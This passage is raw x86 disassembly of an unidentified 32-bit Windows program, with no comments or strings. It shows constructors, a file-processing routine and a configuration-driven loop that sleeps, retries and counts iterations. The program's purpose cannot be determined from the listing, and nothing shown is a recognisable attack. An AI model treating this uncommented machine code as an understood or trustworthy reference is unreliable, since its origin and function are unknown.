  40dcf6:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  40dcf9:	ff 15 54 02 41 00    	call   *0x410254
  40dcff:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  40dd02:	ff 15 54 02 41 00    	call   *0x410254
  40dd08:	8d 8d 7c ff ff ff    	lea    -0x84(%ebp),%ecx
  40dd0e:	e8 8e 00 00 00       	call   0x40dda1
  40dd13:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40dd16:	ff 15 54 02 41 00    	call   *0x410254
  40dd1c:	5f                   	pop    %edi
  40dd1d:	5e                   	pop    %esi
  40dd1e:	5b                   	pop    %ebx
  40dd1f:	c9                   	leave
  40dd20:	c3                   	ret
  40dd21:	55                   	push   %ebp
  40dd22:	8b ec                	mov    %esp,%ebp
  40dd24:	8b c1                	mov    %ecx,%eax
  40dd26:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40dd29:	89 48 04             	mov    %ecx,0x4(%eax)
  40dd2c:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40dd2f:	89 48 08             	mov    %ecx,0x8(%eax)
  40dd32:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40dd35:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  40dd3b:	89 48 0c             	mov    %ecx,0xc(%eax)
  40dd3e:	5d                   	pop    %ebp
  40dd3f:	c2 0c 00             	ret    $0xc
  40dd42:	55                   	push   %ebp
  40dd43:	8b ec                	mov    %esp,%ebp
  40dd45:	56                   	push   %esi
  40dd46:	8b f1                	mov    %ecx,%esi
  40dd48:	83 66 04 00          	andl   $0x0,0x4(%esi)
  40dd4c:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  40dd50:	8d 46 04             	lea    0x4(%esi),%eax
  40dd53:	c7 06 fc 17 41 00    	movl   $0x4117fc,(%esi)
  40dd59:	50                   	push   %eax
  40dd5a:	ff 75 08             	push   0x8(%ebp)
  40dd5d:	74 07                	je     0x40dd66
  40dd5f:	e8 10 22 00 00       	call   0x40ff74
  40dd64:	eb 05                	jmp    0x40dd6b
  40dd66:	e8 03 22 00 00       	call   0x40ff6e
  40dd6b:	89 46 08             	mov    %eax,0x8(%esi)
  40dd6e:	8b c6                	mov    %esi,%eax
  40dd70:	5e                   	pop    %esi
  40dd71:	5d                   	pop    %ebp
  40dd72:	c2 08 00             	ret    $0x8
  40dd75:	55                   	push   %ebp
  40dd76:	8b ec                	mov    %esp,%ebp
  40dd78:	56                   	push   %esi
  40dd79:	8b f1                	mov    %ecx,%esi
  40dd7b:	e8 21 00 00 00       	call   0x40dda1
  40dd80:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  40dd84:	74 07                	je     0x40dd8d
  40dd86:	56                   	push   %esi
  40dd87:	e8 08 00 00 00       	call   0x40dd94
  40dd8c:	59                   	pop    %ecx
  40dd8d:	8b c6                	mov    %esi,%eax
  40dd8f:	5e                   	pop    %esi
  40dd90:	5d                   	pop    %ebp
  40dd91:	c2 04 00             	ret    $0x4
  40dd94:	55                   	push   %ebp
  40dd95:	8b ec                	mov    %esp,%ebp
  40dd97:	ff 75 08             	push   0x8(%ebp)
  40dd9a:	e8 db 21 00 00       	call   0x40ff7a
  40dd9f:	5d                   	pop    %ebp
  40dda0:	c3                   	ret
  40dda1:	ff 71 04             	push   0x4(%ecx)
  40dda4:	c7 01 fc 17 41 00    	movl   $0x4117fc,(%ecx)
  40ddaa:	e8 d1 21 00 00       	call   0x40ff80
  40ddaf:	c3                   	ret
  40ddb0:	55                   	push   %ebp
  40ddb1:	8b ec                	mov    %esp,%ebp
  40ddb3:	51                   	push   %ecx
  40ddb4:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40ddb8:	56                   	push   %esi
  40ddb9:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40ddbc:	8b f1                	mov    %ecx,%esi
  40ddbe:	50                   	push   %eax
  40ddbf:	ff 76 04             	push   0x4(%esi)
  40ddc2:	e8 bf 21 00 00       	call   0x40ff86
  40ddc7:	50                   	push   %eax
  40ddc8:	8b ce                	mov    %esi,%ecx
  40ddca:	e8 2d 00 00 00       	call   0x40ddfc
  40ddcf:	6a 10                	push   $0x10
  40ddd1:	e8 19 00 00 00       	call   0x40ddef
  40ddd6:	85 c0                	test   %eax,%eax
  40ddd8:	59                   	pop    %ecx
  40ddd9:	74 0f                	je     0x40ddea
  40dddb:	ff 76 08             	push   0x8(%esi)
  40ddde:	8b c8                	mov    %eax,%ecx
  40dde0:	ff 75 fc             	push   -0x4(%ebp)
  40dde3:	e8 4d 00 00 00       	call   0x40de35
  40dde8:	eb 02                	jmp    0x40ddec
  40ddea:	33 c0                	xor    %eax,%eax
  40ddec:	5e                   	pop    %esi
  40dded:	c9                   	leave
  40ddee:	c3                   	ret
  40ddef:	55                   	push   %ebp
  40ddf0:	8b ec                	mov    %esp,%ebp
  40ddf2:	ff 75 08             	push   0x8(%ebp)
  40ddf5:	e8 92 21 00 00       	call   0x40ff8c
  40ddfa:	5d                   	pop    %ebp
  40ddfb:	c3                   	ret
  40ddfc:	55                   	push   %ebp
  40ddfd:	8b ec                	mov    %esp,%ebp
  40ddff:	8b 45 08             	mov    0x8(%ebp),%eax
  40de02:	85 c0                	test   %eax,%eax
  40de04:	74 05                	je     0x40de0b
  40de06:	89 41 08             	mov    %eax,0x8(%ecx)
  40de09:	eb 02                	jmp    0x40de0d
  40de0b:	33 c0                	xor    %eax,%eax
  40de0d:	5d                   	pop    %ebp
  40de0e:	c2 04 00             	ret    $0x4
  40de11:	55                   	push   %ebp
  40de12:	8b ec                	mov    %esp,%ebp
  40de14:	56                   	push   %esi
  40de15:	8b f1                	mov    %ecx,%esi
  40de17:	ff 75 10             	push   0x10(%ebp)
  40de1a:	ff 75 0c             	push   0xc(%ebp)
  40de1d:	ff 75 08             	push   0x8(%ebp)
  40de20:	ff 76 04             	push   0x4(%esi)
  40de23:	e8 6a 21 00 00       	call   0x40ff92
  40de28:	50                   	push   %eax
  40de29:	8b ce                	mov    %esi,%ecx
  40de2b:	e8 cc ff ff ff       	call   0x40ddfc
  40de30:	5e                   	pop    %esi
  40de31:	5d                   	pop    %ebp
  40de32:	c2 0c 00             	ret    $0xc
  40de35:	55                   	push   %ebp
  40de36:	8b ec                	mov    %esp,%ebp
  40de38:	56                   	push   %esi
  40de39:	8b f1                	mov    %ecx,%esi
  40de3b:	ff 75 08             	push   0x8(%ebp)
  40de3e:	c7 06 fc 17 41 00    	movl   $0x4117fc,(%esi)
  40de44:	e8 0d 00 00 00       	call   0x40de56
  40de49:	8b 45 0c             	mov    0xc(%ebp),%eax
  40de4c:	89 46 08             	mov    %eax,0x8(%esi)
  40de4f:	8b c6                	mov    %esi,%eax
  40de51:	5e                   	pop    %esi
  40de52:	5d                   	pop    %ebp
  40de53:	c2 08 00             	ret    $0x8
  40de56:	55                   	push   %ebp
  40de57:	8b ec                	mov    %esp,%ebp
  40de59:	8b 45 08             	mov    0x8(%ebp),%eax
  40de5c:	89 41 04             	mov    %eax,0x4(%ecx)
  40de5f:	5d                   	pop    %ebp
  40de60:	c2 04 00             	ret    $0x4
  40de63:	55                   	push   %ebp
  40de64:	8b ec                	mov    %esp,%ebp
  40de66:	83 ec 10             	sub    $0x10,%esp
  40de69:	a1 9c 02 41 00       	mov    0x41029c,%eax
  40de6e:	56                   	push   %esi
  40de6f:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  40de72:	ff 30                	push   (%eax)
  40de74:	6a 00                	push   $0x0
  40de76:	68 68 52 41 00       	push   $0x415268
  40de7b:	ff 15 ec 01 41 00    	call   *0x4101ec
  40de81:	b9 68 52 41 00       	mov    $0x415268,%ecx
  40de86:	8b f0                	mov    %eax,%esi
  40de88:	ff 15 a0 02 41 00    	call   *0x4102a0
  40de8e:	03 f0                	add    %eax,%esi
  40de90:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40de93:	56                   	push   %esi
  40de94:	50                   	push   %eax
  40de95:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  40de98:	ff 15 98 02 41 00    	call   *0x410298
  40de9e:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40dea1:	ff 15 58 02 41 00    	call   *0x410258
  40dea7:	50                   	push   %eax
  40dea8:	ff 15 9c 03 41 00    	call   *0x41039c
  40deae:	50                   	push   %eax
  40deaf:	e8 a1 fb ff ff       	call   0x40da55
  40deb4:	59                   	pop    %ecx
  40deb5:	59                   	pop    %ecx
  40deb6:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40deb9:	ff 15 54 02 41 00    	call   *0x410254
  40debf:	8d 4d 0c             	lea    0xc(%ebp),%ecx
  40dec2:	ff 15 54 02 41 00    	call   *0x410254
  40dec8:	5e                   	pop    %esi
  40dec9:	c9                   	leave
  40deca:	c3                   	ret
  40decb:	55                   	push   %ebp
  40decc:	8b ec                	mov    %esp,%ebp
  40dece:	81 ec a8 05 00 00    	sub    $0x5a8,%esp
  40ded4:	53                   	push   %ebx
  40ded5:	56                   	push   %esi
  40ded6:	57                   	push   %edi
  40ded7:	8b 7d 08             	mov    0x8(%ebp),%edi
  40deda:	83 c9 ff             	or     $0xffffffff,%ecx
  40dedd:	33 c0                	xor    %eax,%eax
  40dedf:	f2 ae                	repnz scas %es:(%edi),%al
  40dee1:	f7 d1                	not    %ecx
  40dee3:	49                   	dec    %ecx
  40dee4:	8b f1                	mov    %ecx,%esi
  40dee6:	d1 e6                	shl    $1,%esi
  40dee8:	8d 04 36             	lea    (%esi,%esi,1),%eax
  40deeb:	50                   	push   %eax
  40deec:	e8 db 1d 00 00       	call   0x40fccc
  40def1:	56                   	push   %esi
  40def2:	8b f8                	mov    %eax,%edi
  40def4:	ff 75 08             	push   0x8(%ebp)
  40def7:	57                   	push   %edi
  40def8:	ff 15 54 03 41 00    	call   *0x410354
  40defe:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40df01:	50                   	push   %eax
  40df02:	e8 17 f8 ff ff       	call   0x40d71e
  40df07:	33 db                	xor    %ebx,%ebx
  40df09:	83 c4 14             	add    $0x14,%esp
  40df0c:	39 1d b8 5a 41 00    	cmp    %ebx,0x415ab8
  40df12:	75 19                	jne    0x40df2d
  40df14:	6a 0c                	push   $0xc
  40df16:	68 7c 12 41 00       	push   $0x41127c
  40df1b:	ff 15 40 01 41 00    	call   *0x410140
  40df21:	50                   	push   %eax
  40df22:	ff 15 44 01 41 00    	call   *0x410144
  40df28:	a3 b8 5a 41 00       	mov    %eax,0x415ab8
  40df2d:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40df30:	ff 15 90 02 41 00    	call   *0x410290
  40df36:	50                   	push   %eax
  40df37:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40df3a:	ff 15 58 02 41 00    	call   *0x410258
  40df40:	50                   	push   %eax
  40df41:	ff 15 b8 5a 41 00    	call   *0x415ab8
  40df47:	53                   	push   %ebx
  40df48:	50                   	push   %eax
  40df49:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  40df4c:	e8 f1 fd ff ff       	call   0x40dd42
  40df51:	8d 45 98             	lea    -0x68(%ebp),%eax
  40df54:	50                   	push   %eax
  40df55:	68 08 18 41 00       	push   $0x411808
  40df5a:	e8 3a fa ff ff       	call   0x40d999
  40df5f:	59                   	pop    %ecx
  40df60:	8d 45 98             	lea    -0x68(%ebp),%eax
  40df63:	59                   	pop    %ecx
  40df64:	53                   	push   %ebx
  40df65:	50                   	push   %eax
  40df66:	57                   	push   %edi
  40df67:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  40df6a:	e8 c4 01 00 00       	call   0x40e133
  40df6f:	57                   	push   %edi
  40df70:	e8 b7 1c 00 00       	call   0x40fc2c
  40df75:	59                   	pop    %ecx
  40df76:	6a 1b                	push   $0x1b
  40df78:	b9 40 59 41 00       	mov    $0x415940,%ecx
  40df7d:	e8 07 33 ff ff       	call   0x401289
  40df82:	8b c8                	mov    %eax,%ecx
  40df84:	ff 15 34 02 41 00    	call   *0x410234
  40df8a:	80 38 01             	cmpb   $0x1,(%eax)
  40df8d:	0f 85 8a 01 00 00    	jne    0x40e11d
  40df93:	6a 01                	push   $0x1
  40df95:	6a 24                	push   $0x24
  40df97:	ff 75 08             	push   0x8(%ebp)
  40df9a:	8d 8d f0 fe ff ff    	lea    -0x110(%ebp),%ecx
  40dfa0:	ff 15 f4 02 41 00    	call   *0x4102f4
  40dfa6:	8d 8d f0 fe ff ff    	lea    -0x110(%ebp),%ecx
  40dfac:	ff 15 f0 02 41 00    	call   *0x4102f0
  40dfb2:	84 c0                	test   %al,%al
  40dfb4:	0f 84 57 01 00 00    	je     0x40e111
  40dfba:	8d 45 80             	lea    -0x80(%ebp),%eax
  40dfbd:	8d 8d f0 fe ff ff    	lea    -0x110(%ebp),%ecx
  40dfc3:	50                   	push   %eax
  40dfc4:	ff 15 ec 02 41 00    	call   *0x4102ec
  40dfca:	6a 06                	push   $0x6
  40dfcc:	8b f0                	mov    %eax,%esi
  40dfce:	59                   	pop    %ecx
  40dfcf:	8d 7d c8             	lea    -0x38(%ebp),%edi
  40dfd2:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40dfd4:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  40dfd7:	e8 ac 72 ff ff       	call   0x405288
  40dfdc:	50                   	push   %eax
  40dfdd:	e8 ea 1c 00 00       	call   0x40fccc
  40dfe2:	59                   	pop    %ecx
  40dfe3:	8b f8                	mov    %eax,%edi
  40dfe5:	53                   	push   %ebx
  40dfe6:	53                   	push   %ebx
  40dfe7:	8d 8d f0 fe ff ff    	lea    -0x110(%ebp),%ecx
  40dfed:	ff 15 e8 02 41 00    	call   *0x4102e8
  40dff3:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  40dff6:	e8 8d 72 ff ff       	call   0x405288
  40dffb:	50                   	push   %eax
  40dffc:	57                   	push   %edi
  40dffd:	8d 8d f0 fe ff ff    	lea    -0x110(%ebp),%ecx
  40e003:	ff 15 e4 02 41 00    	call   *0x4102e4
  40e009:	8d 8d f0 fe ff ff    	lea    -0x110(%ebp),%ecx
  40e00f:	ff 15 e0 02 41 00    	call   *0x4102e0
  40e015:	ff 75 08             	push   0x8(%ebp)
  40e018:	ff 15 50 01 41 00    	call   *0x410150
  40e01e:	be 50 59 41 00       	mov    $0x415950,%esi
  40e023:	8b ce                	mov    %esi,%ecx
  40e025:	ff 15 a0 02 41 00    	call   *0x4102a0
  40e02b:	50                   	push   %eax
  40e02c:	8b ce                	mov    %esi,%ecx
  40e02e:	ff 15 34 02 41 00    	call   *0x410234
  40e034:	50                   	push   %eax
  40e035:	8d 8d 58 fa ff ff    	lea    -0x5a8(%ebp),%ecx
  40e03b:	e8 ab 48 ff ff       	call   0x4028eb
  40e040:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  40e043:	e8 40 72 ff ff       	call   0x405288
  40e048:	50                   	push   %eax
  40e049:	8d 45 b8             	lea    -0x48(%ebp),%eax
  40e04c:	57                   	push   %edi
  40e04d:	50                   	push   %eax
  40e04e:	8d 8d 58 fa ff ff    	lea    -0x5a8(%ebp),%ecx
  40e054:	e8 d1 49 ff ff       	call   0x402a2a
  40e059:	57                   	push   %edi
  40e05a:	e8 cd 1b 00 00       	call   0x40fc2c
  40e05f:	59                   	pop    %ecx
  40e060:	8d 45 0b             	lea    0xb(%ebp),%eax
  40e063:	50                   	push   %eax
  40e064:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40e067:	ff 75 08             	push   0x8(%ebp)
  40e06a:	ff 15 4c 02 41 00    	call   *0x41024c
  40e070:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40e073:	ff 15 a0 02 41 00    	call   *0x4102a0
  40e079:	83 e8 03             	sub    $0x3,%eax
  40e07c:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40e07f:	50                   	push   %eax
  40e080:	ff 15 5c 02 41 00    	call   *0x41025c
  40e086:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40e089:	68 04 18 41 00       	push   $0x411804
  40e08e:	50                   	push   %eax
  40e08f:	8d 45 88             	lea    -0x78(%ebp),%eax
  40e092:	50                   	push   %eax
  40e093:	e8 88 1b 00 00       	call   0x40fc20
  40e098:	83 c4 0c             	add    $0xc,%esp
  40e09b:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40e09e:	50                   	push   %eax
  40e09f:	ff 15 64 02 41 00    	call   *0x410264
  40e0a5:	8d 4d 88             	lea    -0x78(%ebp),%ecx
  40e0a8:	ff 15 54 02 41 00    	call   *0x410254
  40e0ae:	6a 01                	push   $0x1
  40e0b0:	6a 20                	push   $0x20
  40e0b2:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40e0b5:	ff 15 58 02 41 00    	call   *0x410258
  40e0bb:	50                   	push   %eax
  40e0bc:	8d 8d 64 fe ff ff    	lea    -0x19c(%ebp),%ecx
  40e0c2:	ff 15 2c 02 41 00    	call   *0x41022c
  40e0c8:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  40e0cb:	e8 b8 71 ff ff       	call   0x405288
  40e0d0:	50                   	push   %eax
  40e0d1:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  40e0d4:	ff 15 58 02 41 00    	call   *0x410258
  40e0da:	50                   	push   %eax
  40e0db:	8d 8d 64 fe ff ff    	lea    -0x19c(%ebp),%ecx
  40e0e1:	ff 15 7c 02 41 00    	call   *0x41027c
  40e0e7:	8d 8d 64 fe ff ff    	lea    -0x19c(%ebp),%ecx
  40e0ed:	ff 15 fc 02 41 00    	call   *0x4102fc
  40e0f3:	8d 8d 64 fe ff ff    	lea    -0x19c(%ebp),%ecx
  40e0f9:	ff 15 f8 02 41 00    	call   *0x4102f8
  40e0ff:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40e102:	ff 15 54 02 41 00    	call   *0x410254
  40e108:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  40e10b:	ff 15 54 02 41 00    	call   *0x410254
  40e111:	8d 8d f0 fe ff ff    	lea    -0x110(%ebp),%ecx
  40e117:	ff 15 dc 02 41 00    	call   *0x4102dc
  40e11d:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  40e120:	e8 7c fc ff ff       	call   0x40dda1
  40e125:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40e128:	ff 15 54 02 41 00    	call   *0x410254
  40e12e:	5f                   	pop    %edi
  40e12f:	5e                   	pop    %esi
  40e130:	5b                   	pop    %ebx
  40e131:	c9                   	leave
  40e132:	c3                   	ret
  40e133:	55                   	push   %ebp
  40e134:	8b ec                	mov    %esp,%ebp
  40e136:	56                   	push   %esi
  40e137:	8b f1                	mov    %ecx,%esi
  40e139:	ff 75 10             	push   0x10(%ebp)
  40e13c:	ff 75 0c             	push   0xc(%ebp)
  40e13f:	ff 75 08             	push   0x8(%ebp)
  40e142:	ff 76 04             	push   0x4(%esi)
  40e145:	e8 4e 1e 00 00       	call   0x40ff98
  40e14a:	50                   	push   %eax
  40e14b:	8b ce                	mov    %esi,%ecx
  40e14d:	e8 aa fc ff ff       	call   0x40ddfc
  40e152:	5e                   	pop    %esi
  40e153:	5d                   	pop    %ebp
  40e154:	c2 0c 00             	ret    $0xc
  40e157:	b8 d0 ff 40 00       	mov    $0x40ffd0,%eax
  40e15c:	e8 7d 1b 00 00       	call   0x40fcde
  40e161:	81 ec c4 00 00 00    	sub    $0xc4,%esp
  40e167:	53                   	push   %ebx
  40e168:	56                   	push   %esi
  40e169:	57                   	push   %edi
  40e16a:	89 65 f0             	mov    %esp,-0x10(%ebp)
  40e16d:	33 db                	xor    %ebx,%ebx
  40e16f:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  40e172:	39 1d bc 5a 41 00    	cmp    %ebx,0x415abc
  40e178:	75 1a                	jne    0x40e194
  40e17a:	53                   	push   %ebx
  40e17b:	53                   	push   %ebx
  40e17c:	53                   	push   %ebx
  40e17d:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  40e180:	e8 9c fb ff ff       	call   0x40dd21
  40e185:	53                   	push   %ebx
  40e186:	8d 45 b0             	lea    -0x50(%ebp),%eax
  40e189:	50                   	push   %eax
  40e18a:	68 bc 5a 41 00       	push   $0x415abc
  40e18f:	e8 d4 1d 00 00       	call   0x40ff68
  40e194:	6a 1a                	push   $0x1a
  40e196:	be 40 59 41 00       	mov    $0x415940,%esi
  40e19b:	8b ce                	mov    %esi,%ecx
  40e19d:	e8 e7 30 ff ff       	call   0x401289
  40e1a2:	8b c8                	mov    %eax,%ecx
  40e1a4:	ff 15 58 02 41 00    	call   *0x410258
  40e1aa:	50                   	push   %eax
  40e1ab:	6a 19                	push   $0x19
  40e1ad:	8b ce                	mov    %esi,%ecx
  40e1af:	e8 d5 30 ff ff       	call   0x401289
  40e1b4:	8b c8                	mov    %eax,%ecx
  40e1b6:	ff 15 34 02 41 00    	call   *0x410234
  40e1bc:	8a 00                	mov    (%eax),%al
  40e1be:	50                   	push   %eax
  40e1bf:	8d 45 a0             	lea    -0x60(%ebp),%eax
  40e1c2:	50                   	push   %eax
  40e1c3:	e8 67 8f ff ff       	call   0x40712f
  40e1c8:	83 c4 0c             	add    $0xc,%esp
  40e1cb:	50                   	push   %eax
  40e1cc:	bf 08 5b 41 00       	mov    $0x415b08,%edi
  40e1d1:	8b cf                	mov    %edi,%ecx
  40e1d3:	ff 15 64 02 41 00    	call   *0x410264
  40e1d9:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  40e1dc:	ff 15 54 02 41 00    	call   *0x410254
  40e1e2:	53                   	push   %ebx
  40e1e3:	8b cf                	mov    %edi,%ecx
  40e1e5:	ff 15 58 02 41 00    	call   *0x410258
  40e1eb:	50                   	push   %eax
  40e1ec:	ff 15 84 01 41 00    	call   *0x410184
  40e1f2:	c7 45 c0 1c 18 41 00 	movl   $0x41181c,-0x40(%ebp)
  40e1f9:	8d 45 9c             	lea    -0x64(%ebp),%eax
  40e1fc:	50                   	push   %eax
  40e1fd:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  40e200:	ff 15 50 02 41 00    	call   *0x410250
  40e206:	8d 45 98             	lea    -0x68(%ebp),%eax
  40e209:	50                   	push   %eax
  40e20a:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  40e20d:	ff 15 50 02 41 00    	call   *0x410250
  40e213:	c6 05 64 5b 41 00 01 	movb   $0x1,0x415b64
  40e21a:	8b 3d 8c 01 41 00    	mov    0x41018c,%edi
  40e220:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  40e223:	74 35                	je     0x40e25a
  40e225:	53                   	push   %ebx
  40e226:	6a 17                	push   $0x17
  40e228:	8b ce                	mov    %esi,%ecx
  40e22a:	e8 5a 30 ff ff       	call   0x401289
  40e22f:	83 ec 10             	sub    $0x10,%esp
  40e232:	8b cc                	mov    %esp,%ecx
  40e234:	50                   	push   %eax
  40e235:	ff 15 60 02 41 00    	call   *0x410260
  40e23b:	e8 63 12 00 00       	call   0x40f4a3
  40e240:	83 c4 14             	add    $0x14,%esp
  40e243:	a2 65 5b 41 00       	mov    %al,0x415b65
  40e248:	3a c3                	cmp    %bl,%al
  40e24a:	75 09                	jne    0x40e255
  40e24c:	68 e8 03 00 00       	push   $0x3e8
  40e251:	ff d7                	call   *%edi
  40e253:	eb d0                	jmp    0x40e225
  40e255:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  40e258:	75 0d                	jne    0x40e267
  40e25a:	80 3d 65 5b 41 00 01 	cmpb   $0x1,0x415b65
  40e261:	0f 84 54 01 00 00    	je     0x40e3bb
  40e267:	6a 0a                	push   $0xa
  40e269:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40e26c:	50                   	push   %eax
  40e26d:	ff 35 68 5b 41 00    	push   0x415b68
  40e273:	ff 15 5c 03 41 00    	call   *0x41035c
  40e279:	83 c4 0c             	add    $0xc,%esp
  40e27c:	ff 75 c0             	push   -0x40(%ebp)
  40e27f:	8d 45 80             	lea    -0x80(%ebp),%eax
  40e282:	50                   	push   %eax
  40e283:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40e286:	50                   	push   %eax
  40e287:	8d 4d 84             	lea    -0x7c(%ebp),%ecx
  40e28a:	ff 15 4c 02 41 00    	call   *0x41024c
  40e290:	50                   	push   %eax
  40e291:	68 cc 08 41 00       	push   $0x4108cc
  40e296:	68 08 5b 41 00       	push   $0x415b08
  40e29b:	8d 85 70 ff ff ff    	lea    -0x90(%ebp),%eax
  40e2a1:	50                   	push   %eax
  40e2a2:	e8 79 19 00 00       	call   0x40fc20
  40e2a7:	83 c4 0c             	add    $0xc,%esp
  40e2aa:	50                   	push   %eax
  40e2ab:	8d 85 60 ff ff ff    	lea    -0xa0(%ebp),%eax
  40e2b1:	50                   	push   %eax
  40e2b2:	e8 5d 19 00 00       	call   0x40fc14
  40e2b7:	83 c4 0c             	add    $0xc,%esp
  40e2ba:	50                   	push   %eax
  40e2bb:	8d 85 50 ff ff ff    	lea    -0xb0(%ebp),%eax
  40e2c1:	50                   	push   %eax
  40e2c2:	e8 59 19 00 00       	call   0x40fc20
  40e2c7:	83 c4 0c             	add    $0xc,%esp
  40e2ca:	50                   	push   %eax
  40e2cb:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  40e2ce:	ff 15 64 02 41 00    	call   *0x410264
  40e2d4:	8d 8d 50 ff ff ff    	lea    -0xb0(%ebp),%ecx
  40e2da:	ff 15 54 02 41 00    	call   *0x410254
  40e2e0:	8d 8d 60 ff ff ff    	lea    -0xa0(%ebp),%ecx
  40e2e6:	ff 15 54 02 41 00    	call   *0x410254
  40e2ec:	8d 8d 70 ff ff ff    	lea    -0x90(%ebp),%ecx
  40e2f2:	ff 15 54 02 41 00    	call   *0x410254
  40e2f8:	8d 4d 84             	lea    -0x7c(%ebp),%ecx
  40e2fb:	ff 15 54 02 41 00    	call   *0x410254
  40e301:	6a 1b                	push   $0x1b
  40e303:	8b ce                	mov    %esi,%ecx
  40e305:	e8 7f 2f ff ff       	call   0x401289
  40e30a:	8b c8                	mov    %eax,%ecx
  40e30c:	ff 15 34 02 41 00    	call   *0x410234
  40e312:	80 38 01             	cmpb   $0x1,(%eax)
  40e315:	75 57                	jne    0x40e36e
  40e317:	68 04 18 41 00       	push   $0x411804
  40e31c:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  40e31f:	ff 15 a0 02 41 00    	call   *0x4102a0
  40e325:	83 e8 03             	sub    $0x3,%eax
  40e328:	50                   	push   %eax
  40e329:	53                   	push   %ebx
  40e32a:	8d 85 40 ff ff ff    	lea    -0xc0(%ebp),%eax
  40e330:	50                   	push   %eax
  40e331:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  40e334:	ff 15 98 02 41 00    	call   *0x410298
  40e33a:	50                   	push   %eax
  40e33b:	8d 85 30 ff ff ff    	lea    -0xd0(%ebp),%eax
  40e341:	50                   	push   %eax
  40e342:	e8 d9 18 00 00       	call   0x40fc20
  40e347:	83 c4 0c             	add    $0xc,%esp
  40e34a:	50                   	push   %eax
  40e34b:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  40e34e:	ff 15 64 02 41 00    	call   *0x410264
  40e354:	8d 8d 30 ff ff ff    	lea    -0xd0(%ebp),%ecx
  40e35a:	ff 15 54 02 41 00    	call   *0x410254
  40e360:	8d 8d 40 ff ff ff    	lea    -0xc0(%ebp),%ecx
  40e366:	ff 15 54 02 41 00    	call   *0x410254
  40e36c:	eb 13                	jmp    0x40e381
  40e36e:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  40e371:	ff 15 58 02 41 00    	call   *0x410258
  40e377:	50                   	push   %eax
  40e378:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  40e37b:	ff 15 d8 02 41 00    	call   *0x4102d8
  40e381:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  40e384:	ff 15 58 02 41 00    	call   *0x410258
  40e38a:	50                   	push   %eax
  40e38b:	e8 bc 10 00 00       	call   0x40f44c
  40e390:	59                   	pop    %ecx
  40e391:	84 c0                	test   %al,%al
  40e393:	74 0b                	je     0x40e3a0
  40e395:	ff 05 68 5b 41 00    	incl   0x415b68
  40e39b:	e9 b5 fe ff ff       	jmp    0x40e255
  40e3a0:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  40e3a3:	ff 15 58 02 41 00    	call   *0x410258
  40e3a9:	50                   	push   %eax
  40e3aa:	e8 1c fb ff ff       	call   0x40decb
  40e3af:	59                   	pop    %ecx
  40e3b0:	ff 05 68 5b 41 00    	incl   0x415b68
  40e3b6:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  40e3b9:	75 27                	jne    0x40e3e2
  40e3bb:	6a 15                	push   $0x15
  40e3bd:	8b ce                	mov    %esi,%ecx
  40e3bf:	e8 c5 2e ff ff       	call   0x401289
  40e3c4:	8b c8                	mov    %eax,%ecx
  40e3c6:	ff 15 58 02 41 00    	call   *0x410258
  40e3cc:	50                   	push   %eax
  40e3cd:	ff 15 9c 03 41 00    	call   *0x41039c
  40e3d3:	59                   	pop    %ecx
  40e3d4:	69 c0 60 ea 00 00    	imul   $0xea60,%eax,%eax
  40e3da:	50                   	push   %eax
  40e3db:	ff d7                	call   *%edi
  40e3dd:	e9 3e fe ff ff       	jmp    0x40e220
  40e3e2:	6a 18                	push   $0x18
  40e3e4:	8b ce                	mov    %esi,%ecx
  40e3e6:	e8 9e 2e ff ff       	call   0x401289
  40e3eb:	8b c8                	mov    %eax,%ecx
  40e3ed:	ff 15 58 02 41 00    	call   *0x410258
  40e3f3:	50                   	push   %eax
  40e3f4:	ff 15 9c 03 41 00    	call   *0x41039c
